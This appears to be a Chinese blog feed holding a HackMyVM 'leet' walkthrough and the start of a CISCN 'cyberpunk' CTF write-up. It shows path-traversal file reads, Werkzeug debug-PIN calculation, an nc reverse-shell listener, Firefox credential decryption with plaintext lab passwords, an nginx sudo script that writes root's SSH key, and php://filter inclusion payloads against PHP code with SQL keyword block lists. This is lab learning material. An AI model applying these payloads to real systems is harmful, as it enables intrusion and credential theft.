<code>0</code>（因为两者在视觉上相似）</li><li><code>a</code> 被替换为 <code>4</code>（因为 <code>a</code> 在某些字体中类似于倒过来的 <code>4</code>）</li><li><code>i</code> 被替换为 <code>1</code>（因为两者在视觉上相似）</li></ul><p>这种转换的主要目的是在聊天或论坛中隐藏消息的真实含义，使其对不熟悉这种语言的人来说不那么明显。然而，这也可能被用于恶意目的，例如混淆或隐藏恶意命令或信息。</p><h6 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h6><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240823105615.png" alt="image.png"></p><p>但是没用</p><h6 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h6><p>不仅可以下载源码，同时可以下载相关敏感文件。<img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240823150100.png" alt="image.png"></p><p>第一个思路主要是想要拿到相关的敏感文件但是没想到下载还需要权限，因此跟一个文件读取差不多了，之后针对相关flask框架进行源码下载</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, abort, render_template_string  </span><br><span class="line"><span class="keyword">from</span> werkzeug.exceptions <span class="keyword">import</span> BadRequest  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line">  </span><br><span class="line">app = Flask(__name__)  </span><br><span class="line">app.config[<span class="string">&#x27;DEBUG&#x27;</span>] = <span class="literal">True</span>  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leet_converter</span>():  </span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:  </span><br><span class="line">text = request.form[<span class="string">&#x27;text&#x27;</span>]  </span><br><span class="line">leet_text = text.translate(<span class="built_in">str</span>.maketrans(<span class="string">&quot;aeios&quot;</span>, <span class="string">&quot;43105&quot;</span>))  </span><br><span class="line">output_filename = <span class="string">&quot;/tmp/converted_text.txt&quot;</span>  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_filename, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">f.write(leet_text)  </span><br><span class="line"><span class="keyword">return</span> render_template_string(<span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;  </span></span><br><span class="line"><span class="string">&lt;html&gt;  </span></span><br><span class="line"><span class="string">&lt;head&gt;  </span></span><br><span class="line"><span class="string">&lt;title&gt;L33T Convertor&lt;/title&gt;  </span></span><br><span class="line"><span class="string">&lt;style&gt;  </span></span><br><span class="line"><span class="string">body &#123; background-color: #333; color: #ddd; font-family: &quot;Courier New&quot;, Courier, monospace; margin: 0; padding: 20px; &#125;  </span></span><br><span class="line"><span class="string">.container &#123; max-width: 600px; margin: auto; padding: 20px; background-color: #444; border-radius: 8px; &#125;  </span></span><br><span class="line"><span class="string">h2 &#123;  </span></span><br><span class="line"><span class="string">color: #eee;  </span></span><br><span class="line"><span class="string">text-align: center;  </span></span><br><span class="line"><span class="string">&#125;  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">a, a:visited &#123; color: #dcdcdc; text-decoration: underline; &#125;  </span></span><br><span class="line"><span class="string">a:hover &#123; color: #ffffff; &#125;  </span></span><br><span class="line"><span class="string">form &#123; display: flex; flex-direction: column; &#125;  </span></span><br><span class="line"><span class="string">input[type=&quot;text&quot;], input[type=&quot;submit&quot;] &#123; padding: 10px; margin-top: 10px; border-radius: 4px; border: 1px solid #555; background: #555; color: #ddd; &#125;  </span></span><br><span class="line"><span class="string">input[type=&quot;submit&quot;] &#123; cursor: pointer; &#125;  </span></span><br><span class="line"><span class="string">input[type=&quot;submit&quot;]:hover &#123; background: #666; &#125;  </span></span><br><span class="line"><span class="string">&lt;/style&gt;  </span></span><br><span class="line"><span class="string">&lt;/head&gt;  </span></span><br><span class="line"><span class="string">&lt;body&gt;  </span></span><br><span class="line"><span class="string">&lt;div class=&quot;container&quot;&gt;  </span></span><br><span class="line"><span class="string">&lt;h2&gt;L33T converter&lt;/h2&gt;  </span></span><br><span class="line"><span class="string">&lt;form method=&quot;post&quot;&gt;  </span></span><br><span class="line"><span class="string">&lt;input type=&quot;text&quot; name=&quot;text&quot; placeholder=&quot;Type your text here&quot;&gt;  </span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; value=&quot;Convert to L33T&quot;&gt;  </span></span><br><span class="line"><span class="string">&lt;/form&gt;  </span></span><br><span class="line"><span class="string">&#123;% if leet_text %&#125;  </span></span><br><span class="line"><span class="string">&lt;p&gt;Résultat : &#123;&#123; leet_text &#125;&#125;&lt;/p&gt;  </span></span><br><span class="line"><span class="string">&lt;a href=&quot;/download?filename=converted_text.txt&quot;&gt;Download file text&lt;/a&gt;  </span></span><br><span class="line"><span class="string">&#123;% endif %&#125;  </span></span><br><span class="line"><span class="string">&lt;/div&gt;  </span></span><br><span class="line"><span class="string">&lt;/body&gt;  </span></span><br><span class="line"><span class="string">&lt;/html&gt;  </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, leet_text=leet_text)  </span><br><span class="line"><span class="keyword">else</span>:  </span><br><span class="line"><span class="keyword">return</span> render_template_string(<span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;  </span></span><br><span class="line"><span class="string">&lt;html&gt;  </span></span><br><span class="line"><span class="string">&lt;head&gt;  </span></span><br><span class="line"><span class="string">&lt;style&gt;  </span></span><br><span class="line"><span class="string">body &#123; background-color: #333; color: #ddd; font-family: &quot;Courier New&quot;, Courier, monospace; margin: 0; padding: 20px; &#125;  </span></span><br><span class="line"><span class="string">.container &#123; max-width: 600px; margin: auto; padding: 20px; background-color: #444; border-radius: 8px; &#125;  </span></span><br><span class="line"><span class="string">h2 &#123; color: #eee; &#125;  </span></span><br><span class="line"><span class="string">form &#123; display: flex; flex-direction: column; &#125;  </span></span><br><span class="line"><span class="string">input[type=&quot;text&quot;], input[type=&quot;submit&quot;] &#123; padding: 10px; margin-top: 10px; border-radius: 4px; border: 1px solid #555; background: #555; color: #ddd; &#125;  </span></span><br><span class="line"><span class="string">input[type=&quot;submit&quot;] &#123; cursor: pointer; &#125;  </span></span><br><span class="line"><span class="string">input[type=&quot;submit&quot;]:hover &#123; background: #666; &#125;  </span></span><br><span class="line"><span class="string">&lt;/style&gt;  </span></span><br><span class="line"><span class="string">&lt;/head&gt;  </span></span><br><span class="line"><span class="string">&lt;body&gt;  </span></span><br><span class="line"><span class="string">&lt;div class=&quot;container&quot;&gt;  </span></span><br><span class="line"><span class="string">&lt;center&gt;&lt;h2&gt;L33T Converter&lt;/h2&gt;&lt;/center&gt;  </span></span><br><span class="line"><span class="string">&lt;form method=&quot;post&quot;&gt;  </span></span><br><span class="line"><span class="string">&lt;input type=&quot;text&quot; name=&quot;text&quot; placeholder=&quot;Type your text here&quot;&gt;  </span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; value=&quot;Convert to L33T&quot;&gt;  </span></span><br><span class="line"><span class="string">&lt;/form&gt;  </span></span><br><span class="line"><span class="string">&lt;/div&gt;  </span></span><br><span class="line"><span class="string">&lt;/body&gt;  </span></span><br><span class="line"><span class="string">&lt;/html&gt;  </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():  </span><br><span class="line">filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> filename <span class="keyword">or</span> filename.startswith(<span class="string">&quot;/&quot;</span>):  </span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;Parameter &#x27;filename&#x27; invalid or missing.&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">filepath = os.path.join(<span class="string">&quot;/tmp&quot;</span>, filename)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">try</span>:  </span><br><span class="line"><span class="keyword">return</span> send_file(filepath, as_attachment=<span class="literal">True</span>)  </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line"><span class="keyword">raise</span> e  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>冷静一下，整理一下思路。目前已经知道了对应的flask框架，并且还能够下载一些文件。此时应该能够联想到对应的一些flask的利用操作。console的pin值，如果说在信息足够的情况下，我们是可以拿到对应的pin值的。我们便可以使用console 来执行一些命令。直接getshell，一个非常常规的思路。</p><h4 id="PIN值计算"><a href="#PIN值计算" class="headerlink" title="PIN值计算"></a>PIN值计算</h4><p>[[pin值]] 这里可以参照大佬的一些文章介绍。可以看看pin值的计算流程。</p><ul><li><ol><li>username，用户名</li></ol></li><li><ol start="2"><li>modname，默认值为flask.app</li></ol></li><li><ol start="3"><li>appname，默认值为Flask</li></ol></li><li><ol start="4"><li>moddir，flask库下app.py的绝对路径</li></ol></li><li><ol start="5"><li>uuidnode，当前网络的mac地址的十进制数</li></ol></li><li><ol start="6"><li>machine_id，docker机器id</li></ol></li></ul><p>读取对应的passwd文件找到用户 这里用户不能根据nologin判断是不是这个用户<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240914111010.png" alt="image.png"></p><ol><li>www-data</li><li>flask.app</li><li>Flask</li><li>&#x2F;opt&#x2F;project&#x2F;venv&#x2F;lib&#x2F;python3.11&#x2F;site-packages&#x2F;flask&#x2F;app.py</li></ol><p>现在读取对应的mac address ，此时注意需要读取对应系统网卡上的地址，可以先看&#x2F;etc&#x2F;network&#x2F;interfaces这个网络配置下文件下网卡的名称是什么再读取&#x2F;sys&#x2F;class&#x2F;net&#x2F;interface&#x2F;address对应的物理地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl  /sys/class/net/enp0s3/address</span><br><span class="line">得到</span><br><span class="line">08:00:27:2b:f0:9a</span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">(10进制) 8796750213274</span></span><br></pre></td></tr></table></figure><p>id 需要两个文件<br>f6791f240ce6407ea271e86b78ac3bdb<br>看了一些wp之后才发现很多都读不到 cgroup<br>直接用师傅提供的 f6791f240ce6407ea271e86b78ac3bdbflaskapp.service<br>开始计算，根据报错信息可以知道对应的版本是3.11 那么可以跑对应的脚本。[[pin值#具体组成]]</p><p>根据对应的脚本计算pin值为: 129-117-725</p><h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>分析一下，现在目前的情况就是我们已经拿到了对应的console的控制权限,可以直接反弹shell<br>查看一下os —&gt; Linux version 6.1.0-21-amd64 (<a href="mailto:&#100;&#x65;&#98;&#x69;&#97;&#110;&#45;&#x6b;&#x65;&#114;&#x6e;&#101;&#x6c;&#64;&#108;&#105;&#115;&#x74;&#115;&#46;&#100;&#x65;&#x62;&#105;&#x61;&#x6e;&#x2e;&#111;">debian-kernel@lists.debian.o</a><br>直接nc吧弹一个shell回来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap -cAr nc -nvlp 4444</span><br></pre></td></tr></table></figure><h4 id="横向提权"><a href="#横向提权" class="headerlink" title="横向提权"></a>横向提权</h4><p>分析局势，目前我们已经通过flask 的框架拿到了相对应服务器权限。os为linux。则我们可以找到对应的一些操作。进行一些权限的提升。<br>经过查看发现www-data用户有suid权限。<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240915110651.png" alt="image.png"></p><p>可以看到前面有一个riva，这个代表的www-data用户可以使用sudo 的micro编辑时候是以riva的权限使用。其实能编辑文件，第一时间肯定是想到修改paaswd文件。但是我们不是root，因此只能看能不能横向到riva用户。</p><p>可以将我们的公钥上传到对应的riva验证文件中，通过我们的私钥进行验证连接。<br>之后可以直接登录对应的账户信息。</p><h4 id="火狐凭据"><a href="#火狐凭据" class="headerlink" title="火狐凭据"></a>火狐凭据</h4><p>用户目录下找到riva有安装firefox，不多说直接找凭据。<br><a href="https://github.com/unode/firefox_decrypt">https://github.com/unode/firefox_decrypt</a></p><p>Website:   <a href="http://leet.hmv/">http://leet.hmv</a><br>Username: ‘riva’<br>Password: ‘PGH$2r0co3L5QL’</p><p>Website:   <a href="https://hackmyvm.eu/">https://hackmyvm.eu</a><br>Username: ‘riva’<br>Password: ‘lovelove80’</p><p>进行sudo -l 时候可以输密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User riva may run the following commands on leet: (root) /usr/sbin/nginx</span><br></pre></td></tr></table></figure><h4 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h4><p>参考大佬的脚本，直接将公钥传送进root中，再利用私钥登录。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;[+] Creating configuration...&quot;</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/nginx_pwn.conf</span><br><span class="line">user root;</span><br><span class="line">worker_processes 4;</span><br><span class="line">pid /tmp/nginx.pid;</span><br><span class="line">events &#123;</span><br><span class="line">        worker_connections 768;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">server &#123;</span><br><span class="line">        listen 1339;</span><br><span class="line">        root /;</span><br><span class="line">        autoindex on;</span><br><span class="line">        dav_methods PUT;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">echo &quot;[+] Loading configuration...&quot;</span><br><span class="line">sudo nginx -c /tmp/nginx_pwn.conf</span><br><span class="line">echo &quot;[+] Generating SSH Key...&quot;</span><br><span class="line">ssh-keygen</span><br><span class="line">echo &quot;[+] Display SSH Private Key for copy...&quot;</span><br><span class="line">cat .ssh/id_rsa</span><br><span class="line">echo &quot;[+] Add key to root user...&quot;</span><br><span class="line">curl -X PUT localhost:1339/root/.ssh/authorized_keys -d &quot;$(cat .ssh/id_rsa.pub)&quot;</span><br><span class="line">echo &quot;[+] Use the SSH key to get access&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Ciscn-cyberpunk</title>
      <link href="/2024/09/12/CTF-Ciscn-cyberpunk/"/>
      <url>/2024/09/12/CTF-Ciscn-cyberpunk/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240911104335.png" alt="image.png"></p><p>看了半天发现就四个功能 添加 删除 查找 确认 并且参数很多一眼感觉就是sql 注入。<br>但是源码里面有一个?file  很难不怀疑文件包含。<br>因此读取对应的源码文件。利用了filter </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=index.php</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=change.php</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=confirm.php</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=delete.php</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=search.php</span><br></pre></td></tr></table></figure><p>**index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line"><span class="variable">$file</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>**search.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;&lt;p&gt;å§å:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, çµè¯:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, å°å:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æªæ¾å°è®¢å!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不做其他的文件读取，只读一下change文件<br>***change.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;è®¢åä¿®æ¹æå&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æªæ¾å°è®¢å!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看一下gpt的解释对应的数据库查询结果<br><code>$row = $fetch-&gt;fetch_assoc();</code> 这一行代码在 PHP 中用于处理 MySQL 